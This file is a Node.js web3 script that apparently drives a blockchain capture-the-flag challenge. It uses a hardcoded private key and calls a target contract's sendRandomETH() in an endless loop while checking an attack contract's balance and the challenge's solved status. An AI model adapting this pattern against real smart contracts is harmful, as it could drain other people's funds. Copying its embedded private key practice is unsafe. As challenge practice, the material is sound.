const { Web3 } = require('web3')

const rpcEndpoint = 'http://94.237.62.240:31956'; // Replace <rpc-port> with the port Ganache CLI is running on
const web3 = new Web3(rpcEndpoint);

const challAddress = '0x231e61d93873Cd2125C25621EaF2D17F9091C71f'; // Replace <contract-address> with the deployed contract address
const challABI = require('./SetupABI.json'); // Replace ContractABI.json with your contract's ABI
const katanaABI = require('./TargetABI.json');
const attackABI = require('./AttackABI.json');

const setupInstance = new web3.eth.Contract(challABI, challAddress);

let targetAddress = '0xda02082E96d860edFB5ef5C304592fdE9dBFc233'
const targetInstance = new web3.eth.Contract(katanaABI, targetAddress);

const attackInstance = new web3.eth.Contract(attackABI, '0xd3dC77CDe767D64C3Ea791620E5b0cb679De4490');

const privateKey = '0xf9eac51873a8cce2b02f1397d04bf591fe943ae3ab2ac7dfd64f328f9faca5dd';

// Derive the account address from the private key
const account = web3.eth.accounts.privateKeyToAccount(privateKey);
const player = account.address
web3.eth.accounts.wallet.add(account);
web3.eth.defaultAccount = account.address;

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Call a contract function
async function getContractAddresses() {

    await setupInstance.methods.TARGET().call()
        .then(result => {
            console.log('Target address:', result);
            // katanaAddress = result
        })
        .catch(err => {
            console.error('Error:', err);
        });

}
getContractAddresses()

async function getBlockinfo() {
    const blockNumber = await web3.eth.getBlockNumber();
    const block = await web3.eth.getBlock(blockNumber);
    const timestamp = await web3.eth.getBlock(await web3.eth.getBlockNumber()).timestamp;
    console.log(blockNumber)
    console.log(block.hash)
    sendRandom()
    checkIsSolved()
    getbal()
    getBlockinfo()

}

function checkIsSolved() {
    setupInstance.methods.isSolved().call()
        .then(result => {
            console.log('Solved status:', result);
        })
        .catch(err => {
            console.error('Error:', err);
        });

}

function sendRandom() {
    targetInstance.methods.sendRandomETH().send({
        from: player
    })
        .then(result => {
            console.log('Solved status:', result);
        })
        .catch(err => {
            console.error('Error:', err);
        });

}

function getbal() {
    attackInstance.methods.getBalance().call()
        .then(result => {
            console.log('Balance:', result);
        })
        .catch(err => {
            console.error('Error:', err);
        });

}

checkIsSolved()

getBlockinfo()
